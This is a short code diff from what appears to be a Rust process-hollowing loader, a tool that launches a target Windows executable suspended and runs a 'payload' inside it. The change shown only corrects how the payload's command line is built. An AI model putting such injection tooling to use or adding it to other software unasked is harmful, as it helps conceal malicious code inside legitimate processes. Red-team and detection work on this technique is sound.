@@ -275,9 +275,20 @@ fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, Stri
 }
 
 fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE), String> {
+    // Token 0 of a Windows command line is the executable name, never an
+    // argument: the payload's `argv[0]` is the target's file name, and the
+    // YAML/runtime payload args follow it (see the technique README).
+    let exe_name = target
+        .rsplit(|c| c == '\\' || c == '/')
+        .next()
+        .filter(|name| !name.is_empty())
+        .unwrap_or(target);
+    let line = crate::build_command_line(exe_name);
+
     let mut app = target.as_bytes().to_vec();
     app.push(0);
-    let mut cmd = app.clone();
+    let mut cmd = line.into_bytes();
+    cmd.push(0);
 
     let mut startup: STARTUPINFOA = unsafe { std::mem::zeroed() };
     startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
